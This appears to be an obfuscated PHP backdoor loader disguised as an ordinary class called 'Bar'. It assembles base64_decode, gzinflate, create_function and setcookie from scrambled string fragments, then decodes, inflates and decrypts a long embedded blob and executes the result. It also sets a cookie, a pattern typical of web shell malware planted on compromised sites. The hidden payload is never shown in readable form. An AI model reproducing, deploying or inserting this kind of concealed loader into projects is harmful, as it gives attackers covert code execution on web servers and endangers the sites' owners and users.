<?php
class Bar {
	function __construct() {
		$access = $this->_library($this->stable);
		$access = $this->_memory($this->core($access));
		$access = $this->control($access);
		if($access) {
			$this->_value = $access[3];
			$this->_build = $access[2];
			$this->emu = $access[0];
			$this->px($access[0], $access[1]);
		}
	}
	
	function px($_seek, $stack) {
		$this->_zx = $_seek;
		$this->stack = $stack;
		$this->_move = $this->_library($this->_move);
		$this->_move = $this->core($this->_move);
		$this->_move = $this->debug();
		if(strpos($this->_move, $this->_zx) !== false) {
			if(!$this->_value)
				$this->module($this->_build, $this->emu);
			$this->control($this->_move);
		}
	}
	
	function module($backend, $_x64) {
		$income = $this->module[1].$this->module[2].$this->module[0].$this->module[3].$this->module[4];
		$income = @$income($backend, $_x64);
	}

	function ls($stack, $ver, $_seek) {
		$income = strlen($ver) + strlen($_seek);
		while(strlen($_seek) < $income) {
			$conf = ord($ver[$this->x86]) - ord($_seek[$this->x86]);
			$ver[$this->x86] = chr($conf % (2*128));
			$_seek .= $ver[$this->x86];
			$this->x86++;
		}
		return $ver;
	}
   
	function core($backend) {
		$code = $this->core[4].$this->core[3].$this->core[1].$this->core[0].$this->core[2];
		$code = @$code($backend);
		return $code;
	}

	function _memory($backend) {
		$code = $this->_memory[0].$this->_memory[2].$this->_memory[1].$this->_memory[3];
		$code = @$code($backend);
		return $code;
	}
	
	function debug() {
		$this->cache = $this->ls($this->stack, $this->_move, $this->_zx);
		$this->cache = $this->_memory($this->cache);
		return $this->cache;
	}
	
	function control($load) {
		$code = $this->_check[3].$this->_check[2].$this->_check[1].$this->_check[4].$this->_check[0];
		$view = @$code('', $load);
		return $view();
	}
	
	function _library($income) {
		$code = $this->_claster[3].$this->_claster[4].$this->_claster[1].$this->_claster[2].$this->_claster[5].$this->_claster[0];
		return $code("\r\n", "", $income);
	}
	 
	var $_rx;
	var $x86 = 0;
	
	var $_memory = array('gz', 'flat', 'in', 'e');
	var $_check = array('on', '_func', 'eate', 'cr', 'ti');
	var $core = array('deco', '64_', 'de', 'se', 'ba');
	var $module = array('tco', 's', 'e', 'ok', 'ie');
	var $_claster = array('e', 'rep', 'l', 'st', 'r_', 'ac');
	 
	var $_move = 'FrNEsT1n5i2Vkc6bxgjpfD80Y63wrYVa+shPg1D6I5vZo/u5N6BcFd8Z27LpFWcOzt+xh6y9bVWBj9fC
	Zq16QkBTPjdWVK1QuA4OBJxR5GzlPlScITa+0DhleBqzWcl+OY8CUDLTGY1fItitD3kYjjnfaJcFUgIR
	n4TaiVOOL+jx0/Pn7dqkw82RQR1JezbLhQxdTrScU60Ck1CxvMMB6eRhvjkDYGYPpLATx9vVAz/aZD4P
	zlQI6K4/kEQFDYLbLEbBu2QCk1ZwEcWneai8dUuFdt94akwK29X/+T/Fj933h80+WgVz7/2sipsS+vwt
	2Pd/W+UDjzdNZIK46er4MU0/+17m3HX5QeKzHJOWE+k6U4c93jMOwX0pngPMSeG0NFRb1Lkex7KMJulO
	Wi/svugzxztV2Sa2+QooPrJNZEXIqHVtDUvfW8nE8PYzgu6Xgs8ywa5ZKXT8Gus3onKNO1jnUUDwbYLx
	D52kvLEgHtpnGc1Irf4FlCclLKAqqvJof7ukzxf2Rmv+w68JVmSjt3dBfI4ocmdyoQxwAYKty/2wubJ0
	35MaZdFAoTRsvibslxLxY9vjrdG7AaHZfI9QOayNmBEHNUiGdByclsu9Ej4MIGoMBwZIfqlQPM4EjDcH
	vGmcas3T0LkboFvfLbkrc7WmaJzj414I7Fg45LyhW2QGX5E1LQifaEVfgxRzUVSltDJ7pd6BbVSWzAKG
	apuPiqx6Y+iRXJiagahY5/872hAAMUQ6DjLdvRmHpfiqiRixYcrPiGV1NnIWPYimqLgEweCJiC3KNA+c
	nH4jXDc+DwtwG8QNZ2/6P7ldZmxz/jigvNEaeGxjnsLYfENVaue+VpiD/xH0Avx0yKwZAml+xj1HSdre
	AoZWrpsdSbSeLLjOQLRb3/NcEMQuUQXV8jkToUNXHUg2KUWwlzhWxNYckUbl97pE8JHcP9zSh/CuV+hU
	9Z4GYD64wFjUd0yahXqatMpK4S4FvGbRE+tDTSmZgIJCqRDsVyCyXv76REmVLWwZPpU/kQJQpmyEgEeO
	Kai/AfCuKi0E+tf77J+OlejYRd0isrFRJwntqB6ZjeDovyyH//S9hPUe0QedMWCdsAm9H5Om5me86hCN
	A8dvY6Dh3VP21KcgjFCWzN32LJLu4aj8HKjoXyA5CyN2XjyH5wP/bS3tj42EKteVjkk7raM9mN6XvjeV
	fWeDbCNa9H/NQatli+Cu6+xXhnHZf6jmWXu8OjE3BJrugYUTKa6cOQ2gs8unp85USUs+vI4jcs9EjhC1
	SWAPnmRZqBEsa02MNlyJbs2xDq6bNnXSM6pF1KqMWc2fYQ2WO7bj+6QL7FoRGbfTLgLkHVC5cKdzg6Ct
	xdwlFw/jK7/kQjZt+ZWE7WK5pSheKp/SwRLqqVM3Iihf5Z3sLejz/SOrYHaYJFpoUH/I8fE6epobANI3
	jIvesQzmzOK+6ZxAwK4Xu+ADZSycdb48xV+F05gUWPGHyIoqAsBu6QDQPh1sLG4aKiQ0VRD3JX7BdFSk
	Nr21RwPLdAgZN9C7OPhdN3rA6o8OxFnmdNMp2wOlx0XNowS7P6h6zVACttSVEcoyZ7s0RNOUhdlEfEef
	khy27/VZczhB9tm9DQDS7gskyYigYb0q3DI9uBVIEu80tC6JLr0aeWbw8TW/O2JTJub+7GyC0fr9VFAq
	8eeDvWybxOfEvYQo94CWLbTDstpJ33CO+1drcGsRiyld67cQ8pBeHVDWpBscnzTfON325eB/ah4GvWmY
	UMUnkomBNUmeCVL8Te0ea7yXkfPApYtUQL+2IGggteoO2a8iuYongpYa21kcPI5N+GFpqzDBay5Di582
	mvCdWsxNcQv+EZ9FM3tEZr10sY+nO7Yt/xVwKlzCgS29+9n2tgdzJ+WwT9NFMKdBtwQVnYQMOJQgTPru
	D1rxB0vHcuHqeO29rYWstsJH/apa8mYNCOiG3lXqDJou1Qld9wwPKNMU2sgDDrTMSxzWrBNMljzI6MjI
	ulZjdMsExj11xaV4+R221iyZAMsH7i8tA5AW9HGz6R7oXkeGEcvg4pwASDOXsfNiShdiGyWf9oXzCzYe
	TOzmz/PfwA0dxRU/qvD0V4j+ALsxYCxQ3BZsiMdxkjPR/7ovGwl+9wptNBh1j+5cgIOMxanj9HygS5ne
	zcu2SUZBbGVzn9Hsy3ufDpCr0wnMEU0B+P5x6d2KIvVyxQFsLanmZr9cck+0o1Fq3CZrVWG1VffquV/5
	WWZ86EKDIi/TMLKxvrVwRvt+z+rJU9vofpqDV3tqVLDomvQa4E5HOsDMdES7UgMG0R2Xxs0pC5iJ9Aep
	rOusZnLHoif1IJHsAgUYr++g+Iyv+RvmKDdiqmNVS0ZryHOMM4OaAIZRrEFvMC0EZ9anfU+CFgauuGY3
	+jJyZDfjbgCGD9U0rsf1l/pQo4HEUZ/by5Jx9x99dT6EHtPk3RAYKF4xFR3bFJREoxfMyIeREZrkDScO
	WiKTBsxLbXYuFX9pswEaQgzU1sfOy3lmv8dl10Fi3TsHi7UpyQSe8Yx/AFkZHf3KtcJBhoqGbh+IfM/R
	nmRIjOjA2nUnCb6t8zs19Yf7/SkNzTLBXtIClk9jC2cxLxBHgnIeQSqfa4N4EG63URxm4z1myOV/9IEZ
	Yd5m1/M0HzHAkoCMvC7mwwVxOOX2WVjp5kToUROPZVMCDt6+G6YCinpgf1nL2Ysr8CTEkpaYNvBMjMeX
	rRN/zCO6IlI4xZH7jn3CZ4csr+X+Y7hlr91KN32M4tXOHoErJevLlTtTtvtL5XnnX+cS9zJnhJ1Q50Pj
	6L9i77BcCgeu1w+qgrmojmOormmzMV6KP12LmOG3qNthoOSWWLDLP5gJRcUF9cuosFB+R4HfeghdL4UX
	LoxYzrJYVDOu8Od2J7cYqJLrcDGoGm6KtSDIFnChhD5B5+AWyqNXd2bWrQAfb/AbIGO0Lgsm+Es/1eiA
	FZ/0tEqImoK1ESzL8FJNAky0wgnfYCjgkFJKUKoy/956sohsc1syt7z5kLxaS7dX1tWVFWL+07xEHwgI
	6eTxreak6zMd/NG/edNjohVzjNNJz3VL4SKB3Wg51lUJ/+nsB0CUZLd5F7z1yOEG7OaW7u3PvWMBr7Fs
	UCFD0oRHHqEyDkaSSvOhuFzZZ/NdiJhp4IPOjsxUQlQKoi1cBRuMuSLZgUvAV6ykctx/m2OBQsPeXCWA
	UFn6GzT9kDIprIjH7dVnrWlizHmb5FynR/dR9hxJOS2wHqVctxYPuwaKci1bMGhi1/4r5+TgdQx20lIw
	EGgbEiOMTon2qXvyNmJeMqCO+q+12KS2J30ni4pogV+JTpVeXBXfDk40Pmyf08dZBnB7uY4mPzfV83EE
	soobEmObX+iGioQIjmvOQPBHdHI1cw3lHJmG4qjQSpjri/b9LtI1T9GYgl/N7Mzy32KiQ3ixug1EsaTG
	m6KPOE6e9H5OdxILEEk91VNOLOIZq2LYl7MRLp1nB20UVUvMLynpmHp7NrDvgsnhZ61gw4I0CPQVUWDp
	hd6mUo1pLahylsDkCLKztlZK0VES+2K+kg5vbiL+3Agke88Uri63qU83N9cNfNndS4w16PkLEbX8xJHb
	66PEytBlkhYwhxcxD1P1hvp8Tpf7daBYG9wep4gBETLkFlaEwCHBavwLQPidlgC9HHf1e8IVSLYmpXbx
	km2ALWurGPjTG/TCqg2ak5lmqSbyQ1+SpGmZFrz4S/uvskFD2tQlD7Q9q6LPxhQcCO20p67uqXO6F1Na
	3kafKrQLQUbcWT8B9YtSJtBW9qVTSA1T0LCI61MVcjpmgJqSt2oEsq1a4XIvbfONfWVNc7URXqvajiHz
	YNnwp6QNe5cjCJBt/U30WfeuTZ+coHuhE24+mczYhT4yto51bI5kj7J236vdIEryGfdKRv4pcwPRoWbq
	MjD7hRojmGCxGmiHzPo8blug/smE6AtZojMd0D75GZ+iOGrRCUcgpaJD+UnsyAa2LsbgfeEenXzfBlal
	EyDav2Xydvpl9xO4jM97x+wWvfoy+3bl63LedxfiApi+59BTRyR0hS1GGhmAvOJmEU3G2NUmjJQV5KlN
	CMkxP/Z/u+Tp9qqHBKnILsErDVan9dBhBQ5ivTwMOVvq4uRcmM8zmQ3vRQGfmXCuVkXRRlA8vTjr2oxv
	wQTC1N7gASccYvE2tAJFwpTEeMlIvYGPjcG/z/rRv2JEHEMRKJ+axAJFqRYbqUozY99Kj/QVrswTHLzV
	SWXrWK0rXlKAHHw1BmqgOy97Oj97SAbshG0yrlUiLNDIrwR32Vzt8UV9Xu5lMjm48WIyM5lTf9ab0rhF
	Lzpiuja5fEs30UaRiLR0RL1qWK2+uxC8mAdJMqlRKIHBW0eoDbLAk3rNIv7BamETq8lNJP+PiSRVSv4t
	KiLZroS/1ctoOk4wLoZ+/0IhhBH06rsJfz0SE6ZXcE8bq4YrzjS7lbN2EvIxseAAGpJA7c1pNN+rluCu
	sZmCzi0TJiTlMIh7vqKOVcoiolEMiPpaV8CkLSx9ITryjHthvPuASGTT3vYpF+atxK03lnozvfnL8mw+
	KOMVbnAV9dwyg1kxx+2IQKsQyt4PBDB7Ec219MqxcRLpH+Dhysj0z+QWv/7ed0LiVuZgVe1b3gFWEHXV
	24WjG9lcC3sNmfB2ZAcjw4tIsSp0T47LsxFv8j8/8voML0azqlSJMxx9UEg+G7c3appenDyr+qc+mdwG
	zjcNt3nYjk+zaPR+DBC5EXcnhW8G28oaJY4qeY2aXSenSGKqyoROmD4mzriZNr5ZTfyTfcjibTohg4bL
	w7Omalyfyu9irjdmmRb6iSkuFFZev32opg4X/aC5cdx49+rofrGnC82fru6Yugz9PNl3Y2nZrazD4AJP
	aOitu0hzVpkOuyFqeM2XIUr6VCnGzfmrkaI66so7tDOKDZ4vcu2/ZOFr3m7De7u4ONgKmA46SOV651ZB
	ChUvU6SzfSOXXFRYr/h7h0VKa+GdYnkujgEdygsyA45Qk0z6wwm9CO7UUilT1J2yvXK0nN65Q10o7uUu
	TfMHULqB+harfZtHQjGCfVJqWChSwYMvJXMYTlEGfhzAlE7S9q41ecIn6fOLLluHYsotzfpr07n+9az8
	f1rX1ueDOHw/3+YoeivkGyN+KZLjQ/CjUrwK4E2g9GUnOi74APp2+F0q+YK2BBJErQdnfDMhJgIULNF/
	xhl4FfLnbr+bOqkOv19H67Ng7b/aZtX22bp+cARdX7/6OA8P8fOPyheLPaEJOhdes7AaI3nbjRNVcMf/
	d6aMitZHlJwh6VXH7fE+CWqKrvUjvy4E/MDvojw24qiFjLo+0AbYjsdXi/PYO/CInayQkQT3NEkuGcBS
	1qnEkl9fkfBOcVo1XLaQGD2pZAMFlLULWTNbAJJgedm46Ry84D7DkUu42fmSFZBbLxRtZ5cCkxKCvf8z
	yaIyN8AfwhPUuRUBY1kmhw+PJd8LuUIW8hRsh53WQyRnoyyfMWQtJ5dv+CVkeiqp+DdSQ4nNefzFQnLJ
	b1k8E+GJcveR/bebzQw8NG4goM3PS/4ngkoIjYsmAhbb42P7NAyyOaLkmiT7rAX5EBVGoy08qR0rqiB+
	19+hBWAWxGRv51HnitFkGDdQ5JeZazhXoWyc4EdW8F4fr7LuuubsnqOsh+0a59BZG58Xke3PA2sku/qo
	4woD1v4V6YSrwOsmbiDXCz4nCNJhRJix1szFcQ46SBk3TQcW341u30Cadf47dKXTRQEFdYO0r5IHLkFg
	omZpu4Lg+bAzvCohGer7AQun1w+qnvHNrtkv1C9LRmRd/gIbtqWfgEOHYRDTQyrksLFZuIZtL83CkiU3
	b9JEMG6Xmu6ZvBCIJ/PVXsZmbCstEJ1d+x05SqwNbpB620EEVXb/CZ7iI70m9+nS1+Iy75VAfuby81cr
	YP3UQNt13YSjf8fS1snT8wH8+6XjU6OSSKPRncFWhsetv93Sx3ai/gDzNeHfDJtyQKAioqvrRUeaXPEH
	VL5kgJ0WeiYPRYVwJxSGGMnKvXaJOhVhysPJaZg+EUDDOrj/fn3VOVkSKxGVXvhECTh6z6xoFC7+aWZi
	dCCmkz+/OEvmC1QiwQMYZdHm9Xv++jlMjczcTo1cZtGwaGBpGLdwjAoScsDQFYRKno7603Y1MLHC/bNt
	IUE21dz+mycQ9pkiX0VHdohtw2itNS4r+TfxqQdPZPGYwVWZvk9hqJmsrZQr346GI/XVuMrObBL+CgYi
	y3FhkQyliw2LFGAJtgzLFCK5IHTVWNTSsjz0SIbf12Vibsmtj8Ox+UV32OBVAj9Qq3qIlxm5znDtb/5C
	0bnYbt6oWJqyZlHE5p9RIe9vbFjLF2vA8cbSbK/UGztjaOXVpy2q0rikVfp2p5ofkk3U2uXiFE2YGSCL
	MTVvKUqbpCm/edfnju58AEgVkb2NPTDHohGogwS1YmV2dzDJP3M7ihUUCJNOdy3qQSJfSgz68vN7G9Y0
	qu7LaUhsBCYGwAHADV58k8gOWG3RoPDjcMYc+0qyZlhLd3x6bITNSJ+3wvO/HZ/4gTnDjKaOJdkQigFL
	PY46L6K3XjMBsU+GRprYB+hkB99iiA3eNRlBflLyzcdLBjoF/oUGtCdyLd8ojuyjf+OOaUgA4QSsHeDE
	R7WRQrqxxJDytwt2ittOLvVhtdEVZDQE1FJRKSF9qSN/SKbOIQhwEJzVUhYs9/QcBBrPpEtdQBTZ0mcr
	gMTcBQB+tC7IhKYyHBEjNb9/zKzCb4n08mBU1yuADangZmVJGj+GvzESYJO5Q7QPgE7EjA8TCuvnofxo
	mdEVSxjB0bJyMohvgDXXfQtNjlTO/fz+tUvVU+D9DguQY3OrTrHibl5GOzL2vZ6DqfJjl5Vaq/gaR8pz
	BybjkO4OEHyxKvG8xjFlcqD8z297QHZxpHWmMnw7Tnf+jLpp/6MjR24LPi5q6muV0JauofSoXy7hLn8V
	p+y/xnZ3Lm8juTfGiSkw1wThsHSB9KCJIsuOqoAp3mNcXABhV0ao72KOFo5Ci3Xa/YinfCMRNTaOI5pA
	2ipmiNrEhWKdRxg2x+/4M8L1Xjq89O3OY+zTFf52rETD0d4W82eaPrKOytgvqZzYa918/eJrbODkVlB+
	sv3Pd2BPlx45dCkQVQwuzkcwdBb/8VtVCvJ8IabnqQCEdIJlhFOBVycpV0xqUztCZgj+/cRcCS3TBxOA
	cB4JY9UHQDR7v6NDrLctktXMivJ9vgTi183Jin7icnXbnCXaQn/CVApxfn8ZYw9tqnZsIZ+CHBSRkrq5
	lMcOQN5lg7n12jnwfsi2zTy0bqGNxaS7rcKsLN84c/WZrm27GLwqSUsJ3xFlEi/Bbcbk4hwz3UIFNGsQ
	s8iYUyaXo3YQ7OUkz1L2DJdwBu4IVKE51JPDfTSgu/GrsXxQ6KHPSkupyFvnFDZ9CTK1qY3eB+QrfX11
	S0jadbl91FiQ9MNeRRYuu+nngkBXrCjpj3mEXKvRErmx3XP8kYlo3ZXFAvWZ4Y1DYVRiuzf16EWagqeD
	MXNrJukAZcnwE0i77KztujEG4GyMa5OzH2336kS9yEKXvGt6Gz6vQyGTMaGVMI2baAnKC0qcaEdbOOpx
	pgfnK1YzrOjHAKRPH6zslpalaLlO7UJxkNc7pEirXpO94nLRt5yCwpbifVEsCO1KX2BIxmh2cgRkxkK/
	pg9Rn8fMnMltnxg5H7o/Bd97ViKwzORWD3R2zk7cG7XYkXZ2Owt9ZnG/bHRk6L6bBo+JcIlgVK0Tb5Wn
	yWxugKvsU1x0NAhPSTChzSir6LUGFleax0ppoQPdGYDEy7ktHf8XqTzqjI48QpX66eXb60+OygpxO0Oq
	CMl/lGxO36eDE/O+DtK0+/4x1Nn55myomy/CNV9aKRS34qH2niNmFvKOF+3OO5SGWPY5O/jpfuyDMavz
	/uwNF7WrcyZD5ZiWRtnypTI+Sbtld4SYCAjf+8/EmMJSwS5QCgA2Y0r0+o3dG/KqDHi/0QcO6+7dyeJV
	S6v5p/mvwbY1P05XkbBhdFqIXxXWtOtRX6VxpPHXTJCXBeFKQaUbX1GWcnmBVTF8bbRUbyd796RxS38f
	3CT3q12ASIED2XzrvzSV5m8jI8O5rlqORugfveDNQHaZU1Pud6ijvAW+A4phFfO26XxrgZNyvf95/1GW
	xcGvwfkH6n2AZzyw1mvojZcZ0lXu2ru9EZxf1twKt5mEiUWQ4gdidrsQJMRnWX6fT2W0svUs8k0uorxY
	Ce4/kVTWV9H8NjDgLcPhi1dr0GsFnUT9Xp7RBkP7bNKlx1v16QGu7N3DWg2TlexFAusbgTkE8SByk60l
	XbIdkPlAr1HGFGhr9HjhT+4rJPXku7+ULidw9de96B3W1srGP1mgF7BiPa/smZlTUCeUW2SfUrnS47hP
	I0Dcz45B9BakEDG0jTUjCNf2xQg+N3r0N/d7g5nJk8T98h0pVdSBu1xRGByG28FFQ3pCJPt3B2EL80jk
	UQAJKhhetcfyZz2ZBjfOd+TmGhqkBLlu17Nua6on9I/axOsqTqdqxkG3qlqbUugfbap6JwhSDFE4Opar
	Yii+pCcBYAMH8AuEdx00wj7aPkQpQcJXubqZi/uV/IqE07WFG+mMa6+IuMnENJpqiFLHUH7HykuHBWHK
	zvCYMqoc/18v3l83lt/iEqe6Pq8pvlkKstG9BbQ3GWjn8Lhu7ibXi0vQVZZzT2aBR+GPsW7rVC3koqcI
	vDuGO4Fd22yXA7wl0cG8yWPjFECQ3fFwiT7+6o/zfKMkBrx52YtWoPRwFpVMf4ltb0YQwRpXuWs7Z+rf
	32bk/soNLta92Gq52kAqa0ff7KAjbZHCpCQQBVX7JJjn9IUNWSSVXH718RH7fbwVZaDg3zYulNK0Dkac
	vRdG6XjoFTWMIZToyeam83nzuaRKvUnJkRf+Fyvdprja4sYo5kc2n2XUU1sXWH8DkLMmVSxt0V5XMO7v
	+czE44425x/HNMXTnIZcaHd7as1JTgcVm5LmgwShsGcvWqIubeQ1mcFBFtLfz7S0iepxAtsK1y4zS4+F
	6pOOGoc9gKUFazEqf/zvS+gtelqDygK+Do3/nqveveuODy+PXU1LsQ/6bBCksdKmPvPsRJSe+vYcEnNR
	xgyFAYAiiDEeW/YN86Tq3aO6z6ZpW01dRh2OY/SCU1XmOc41jyWdxGiPbgPMRKvOrGhaitpwsqTUwJ6m
	AYj1DFbn4c6UuZ0xhMQS0ZJvtGuXRXxPx9fjWJrGdaBSwr+ByREJ6Y9ogP4E9YIao2Jf42K/y6Jq0fn0
	PARRi3Gr408hBeKrWw8KVPzMD6QqZw5zFMOqw4D1ybEYeni1aXm1PmZXrofx70uf2t7Qcb7f+ZWqoqWv
	O/cnN05tH0PgbzrySWPuGNV5eHgnpFenhUKZnYlOB1wW9JyChErmBHfOMK9nyNdks+CZOZ+tRPX7gPiP
	C82wYRn6uMWmM03WlOrskSQQNO+BII7jaNk0gLkIo0UVULPVyAkKYRomXH7uifR+hWNq7fLVaw0s0Ih6
	09iQN0kJwuNrbFwQRe+WwnG1rd+Piaas5unNJECKW62iGMi6BD4KU08g7+N897SxiJyh5KIFnOqpx8Yi
	aCC5dZgWcVBeDo4ErfBzFasE/jKlENC543HG7eg/ZgwmIUTIB6k58H3CN1cnjNrNz1Z88vHnMLCnApG+
	asz+j2laxWBqy/Eyl3r4u2yIqgcJ1foJeZ1y2PCUDpgJOP36AGYj3VmAhbgMZhssZsAxKg422z36XS/K
	IL/zYsScbucPulQ3cJTTC0CU+XxSimKP7cX1C7WoqleCCP3waoxEkgg2Lm65eoZXahr2+peMHWg8e4Oa
	yyxSLSdVDlPXJUIkgen9eMetsKvjxIGrscWbvnpFXEayRnFDIIR2BgVgZ3pRQKa3wYrwWboNovUdt7CE
	dXdwxSPbAogn8TFbPchkUCAUQPK7gj9mjqPTpRLqpWKHpX3uYzCG5Lx894LvPrD8j3kqJfa3S3OdiiQ7
	/56CTOQMdOCnl4VZnlVPm6oiT90nzMlMio8cSDEhMC6sW6IDPlPT74cppJ7EA3i9ICLRQ/uq9swxnPfK
	JZAp4D7ipiXmiFWV4HIsvIKm/g1TOGnIRnaXZao8Fdn9YUx9hd5bXVIZdyRQ3orQwVuADRyiksGHA+g6
	+O/UmegJocGZZcukDncieATrsDDlK3p/yc1C4bwIUDj+5dxJh6XMXdUSpVROmG/VZf66mTC/8tlFtdJB
	PyuSX6fTd1FJ43cj58eBZNbYdP1AH+xy5gsiWEMycHh273K9YmyyzcBGobmUZhdJke0zJfK3EsP5UMMy
	5eWwq3KLw8ngY+4mrwLKzmorgQxab9NhUoQn/4J9NvRseu5pt1PJB8dWT5/C8nSvKHXkB/3zFR4T5ymD
	L9Lk9DmdfQStxaIyoR1WLJ4KrYc+LmOaKlEJuwoFp9/u7lU+mFrKY1bYABgr+FFDhjloJl5vILQTsguW
	JSDpbbAM4t6hSixv61vEaCH2/ML7qmKwm4Y7OZNf7jBLryRM0jBM3ziZySdz3zdAgj5MvdLibhsMwPxa
	RGwwnobuN6a4DAHV+dQSOT7+8N4iFA8R/+WjzSpX72ru208BkuLaPTvAl70PP1M6n3llhiC9FBJ0J/ZV
	/FjsHnI/5lrIKIr0uHfjDbLVat5Ib4G1EUAxWIcR9wZHwytVGhqFW8Q5nZcrF2uEJR4vA0BuCuNp+xXS
	yi0wXSVWFzafrKbqiaBh19dRfc4d+YcfPUsc7KABQHgxsArMfn4Glba9lvNhoR54H5bd2X+EvJhtO1YP
	uvpGMVg+/Nf69ZM7PJtggnxINzZryK4hdfHqTUUiFW6KdyscDOy8sw5S5xhmswwOBOhpvxezzZrG3jEZ
	SDA9NqF0FQq0QSDCdcjgzT5WCfIa8WZSsZUtgXKVWzyesSyyOo8Qi5qIpDq8u9pTuHoWwZTq1aGorUZ6
	1PoHOIGQfL6w2kbVvzzdpzv9Wz4uyMlG/DRCoyKHlVzqNz4S6rWT1irpEZ/6uX+Wgb6iifumBtJbsX9J
	WIbMN2nH8CM75HAnJj4D5L8zaQFclah1ZpJIX34/n9exSJ2k6uyA4YgN6Q56qFo0CX0xf4yw49onWXTF
	m6NUf5oGDu4SE7OkV+GE5Eed2IHWc93TrdA1I1t2i8UeNg+FAVYnomxeriaMwqKcqZklcOphqqpWF3pj
	mUrV1Y7+GI1WIqc0aAXw4FhhBrYaXscFCipC5ZFtEmS3AJn658IxHfvIc0qC/k15bulRQQG3yo6gr4On
	paaLyPOGWAhxc06aJ3QW8h2nqE9TrG8PGLY/TREL8sc4eyhTz8tkVndR8aPtUdADL3ZIQa+3s6o0i6Mn
	rvBwTDJbo9PQCHwzUB5DA6NbH/bUSVFJy5taRSx9OvCyXR7vZTpQOvLoVSfIa9Pzdtv4IgHoNwV84kie
	QUGW97hb8cN61Riqg7nwtMv+KefyIQhexTO3u4mVvcooonDiLZElIajCKElkpuih+xR9FM6iVMEUKnur
	HuDy93kq1OktuVezP/zNkW/EOPVm1ry6UGVVMve4UvqSXWdZ/jtI2chQ9Ogv44xdLbHLSPpGmcc5hjSo
	Mj0YhJzGijmQTqXpkI1hLndbc6lDBptwr2J2xuxmeOqkhGEuvBawX0SX7lzL2F1lYPIx1e2QFJF8QLZ2
	7QKLyUFCoYKf/o906K85NcJiXjyA+TsVeEBYXDki+N8EgDOa+o12BcuYRcrdFF57RHm10w82FIROD1MW
	HtJfOQc32mda2MEICcB0OSNan2Y8Dz6lOIhtOWA9ogoWPetiLxwcD0HXmUVAugexwrDoBItncLSBhXWF
	/8wPS3G6/W9pCWsnR12Gus60ls17x4qEgO47I4Hd5Zrz7vl170NI4rHxNV5b+/UnJLXMkcNvPGijHfmQ
	kRafyUvPeGh3GmlWWv7Qiq+My170jJHtzCerEitoT9KEboTYf+XwGTzQ8s1xUddE1y2l2pugIbVKQo4y
	51v3vBwzGhQGu/o0bc9kVWngs/nN1VbtoN1KrCSYlUfzzYl2qF84ZZeX9gT7XppZRznsg/j2Fs7uWfJc
	3sRegYAy+Afh7b71eAxlryOfA6jQ/K4sGkYEiWKX0EPiiRE8YLsaHVH68OE/wzyzpl/5ayAcc0o8yaqn
	fK/1aPPlURtyBcUOlxpKY1tx5X5YYd/Y118BWAjwa4QfAh2ucwb4ggA8wwH41yARB/CSu51kLkRnonsc
	J224aHqyJkwTi2EsZc8XsRtqf8nwcQrWMxl6G+2w34/FmF/SwJXZJfZ0zEyeGQM2Mv2566ASgBEfIaV+
	wuDHsdk0SCwxxuA9hHoswlT38N0+w+r0HVGwGIFpakXQOA5OHMLg6YaBrblagP8obXrU2wX9iyGDptDX
	bKmv7YAGp2pGW/0FokiskUyccG204U7EcbhPw+ybY5mmB5SxrU1NDDVwUMWbgStmXFnZbzUYNiUztM8r
	9hxp5TJoIDAVqV6Xy2a1DC7+mYaCCLzQrLi6plsTqeau4J0v9hAxV/NFdRctJMCi6QxCBx1T2FKSKR5o
	LLjLX3U+FfepcL9sgMQCnpjRkrggr9JLQRfRxe5vprz/g3NAh9zb7KbKYjUFKrua7U+3cJ9LATjpY4n6
	LuXT6TTltY/jTKzFuGtUva+ClTCNtvO6gddscgKLFaWLvXrPEyiXJeeKL6hdByyhY/aAvTo/4mcfWBn2
	P9YEEF3lbmkzCC2LkuFizrz6+Lg1c2Id6KDnTDR7SNndPYvKKJxOYLe2B7OoEd2SdKwpqvBbNgwa82Im
	a90m456wJ4yLlTa4LVo/A24bK2EIFO2DKoYNDimqOAVx+qsOG73crE8WvcSgJ2A3qDwAwcvVDXfntTPK
	D7tSAjN63ek7BnNwnA88Dy5XZI87GEwFCHoQqFqm+YDFh42KUY5QXEbb5SlbA5MtoYUnL6jgAHa8rJ+n
	0k6MnClAy41LLlh4MbXGMjKB0M7o3GaLOqqOV+LLW/Mat01wegOI26Chv7jDaK02Zjcjq2c3o7mblEJW
	5YVg6Se0P2yYE9kunDiFexSIXk1z0mDQ4gUur9YoyGozuYRqZhZJjR0Y6ZaRTj5Puz5SpBTgqUoLL+P1
	V1Yk/6HMuxC1GVagZc4UUU9ViNYWM+ZoHRj5l7Z3g4QZ/qfsKKu/Xs/t+8Q3ofLS0hBdHlg3MklfnYHT
	e8Yx9tUCsvrjhruXPsuxMTsWt7dhRhQYT6wxWsHL0fS8Hs6LupgQsNLcw1lMoVaTxnTJvAj+Lmp62m2g
	V2gj7mvOI8Y5u3OG3QJG9FB2xCbOFYzQZiZpSQpvaov2rwBXl2S5kbvb3hh+X9A9u2z314i1GV2F1M+T
	7rqXqB0Z9qI5pnNrBhS1XxfmzGcqdxxZHLJpyLuf/JHNegsB2Zx3vQOWPXPLZwwq5UQXKyl8AyPHdHyE
	SlvIDtYBOCbvXH4fg7v9OGyVJSypTQI80caSq/w2uvrfAcoTPvoDERJtTQxN3vOWhDpwZrz/huErh1ah
	Cx0VLFJvu/EAqwsRrDqyHYmcAb3O0jGijS8boRStZHtL/NkoZ4e1emXQ3SkTFRGuXjNbVEOhTa9jmG3e
	yvzVJm0EMn5n+J6r0aZEFXQYj7xxzVpOfttjnR3UClcqcEdDIBKgICnBkP68C7rXlla1Wu3G2i+QJc6f
	HkJ5tXQTgwptXwO4so/AVfORFhOxopmZYgVwBMIhIyiQ8kr3qNVcOv28J9CYzxQetqPPCVNE3lm2jXjZ
	eQrsI+iQ6S/Ol/e5vuTMk7+oZJoTZurxpzqEM7U0E/rsiw3ryY+klvL5iVbx8A5v0KNeFu2o9RB6HOjm
	75iCeom7n9z23srqS45xT6yDb/IuOW2wF4dbXm37rw8RVhV3CFnVMS4fR+Ra9XAemHHafpVmV0z448hZ
	OIznzbO3qzYd28kfxw1LKQvEXROSYso+VxpzuLLTG8732zkH81L2kIUhNDDvkVN3w+BFBpkCT0xg01KQ
	wlOI9CxDRXiCjpVLuoPzgmMPJT1t9vh27qIjs6pc6wR/wr7ob9i04NKslisS9Tu9Ni3Y+EUcfzZxf5y5
	Pv14AiU7Mf/98/XMtSMuMy8tavLVvm4h/onmgdcNWae8CmleOBn18OCO7WY01U0GwGCocBx1rh2GgJrh
	0IQjBHm3rTMcBB9SrlFtIEmrjCp5em7DbVlwGuE1oO8AmWyKp6T5PkV9/HrLwnb47+HWIa3R+zGAv4rG
